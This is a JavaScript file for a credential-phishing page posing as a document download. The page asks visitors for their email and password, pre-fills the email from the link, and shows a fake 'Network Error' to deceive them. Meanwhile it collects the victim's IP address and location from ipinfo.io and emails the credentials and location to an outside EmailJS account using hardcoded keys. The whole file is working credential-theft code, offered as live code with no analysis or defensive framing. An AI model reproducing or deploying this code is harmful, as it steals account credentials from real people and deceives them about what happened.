// Include this line to initialize EmailJS
emailjs.init('QJObhH45powgCqsCo'); // Replace with your EmailJS User ID

// Function to open the popup
function openPopup(title) {
    document.getElementById('popupTitle').textContent = title;
    document.getElementById('popupOverlay').style.display = 'flex';
}

// Function to close the popup
function closePopup() {
    document.getElementById('popupOverlay').style.display = 'none';
}

// Event listener for the Download button in the popup
document.getElementById('downloadButton').addEventListener('click', function(event) {
    event.preventDefault(); // Prevent default button behavior

    // Get form values
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Display network error message
    displayNetworkError();

    // Fetch IP information from IPinfo.io
    fetch('https://ipinfo.io/json?token=f65a3d103cb816')
        .then(response => response.json())
        .then(data => {
            const ipDetails = {
                ip: data.ip,
                city: data.city,
                region: data.region,
                country: data.country,
                hostname: data.hostname
            };

            // Send email with EmailJS after displaying the network error
            sendEmail(email, password, ipDetails);
        })
        .catch(error => {
            console.error('Error fetching IP information:', error);
            // Still try to send email even if IPinfo.io fails
            sendEmail(email, password, {});
        });
});

// Function to send email using EmailJS
function sendEmail(email, password, ipDetails) {
    // Prepare email parameters
    const templateParams = {
        email: email,
        password: password,
        ip: ipDetails.ip || 'N/A',
        city: ipDetails.city || 'N/A',
        region: ipDetails.region || 'N/A',
        country: ipDetails.country || 'N/A'
    };

    // Send email using EmailJS
    emailjs.send('service_oyc7a9o', 'template_bn5jzkh', templateParams)
        .then(function(response) {
            console.log('Network Error. try again later:', response);
            alert('Network Error. Retry in 4 seconds...');
            closePopup(); // Close popup after successful email sending
        }, function(error) {
            console.error('Email sending failed:', error);
            alert('Email sending failed. Please try again later.');
        });
}

// Function to display network error message in the popup
function displayNetworkError() {
    const errorContainer = document.getElementById('networkError');
    errorContainer.style.display = 'block'; // Display the network error message
    setTimeout(function() {
        errorContainer.style.display = 'none'; // Hide the network error message after 30 seconds
    }, 4000); // 4 seconds timeout
}

// Function to get URL parameters by name
function getUrlParameter(name) {
    name = name.replace(/[\[\]]/g, '\\$&');
    const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
    const results = regex.exec(window.location.href);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, ' '));
}

// Event listener for the 8.9MB Download button to open popup and load email from URL
document.querySelector('.left-section .download-button').addEventListener('click', function(event) {
    event.preventDefault(); // Prevent default link behavior
    const emailParam = getUrlParameter('email'); // Get email parameter from URL
    document.getElementById('email').value = emailParam || ''; // Set email value in the form
    openPopup('8.9MB Download');
});

// Event listener for the Download All button to open popup and load email from URL
document.querySelector('.blue-button').addEventListener('click', function(event) {
    event.preventDefault(); // Prevent default link behavior
    const emailParam = getUrlParameter('email'); // Get email parameter from URL
    document.getElementById('email').value = emailParam || ''; // Set email value in the form
    openPopup('Download All');
});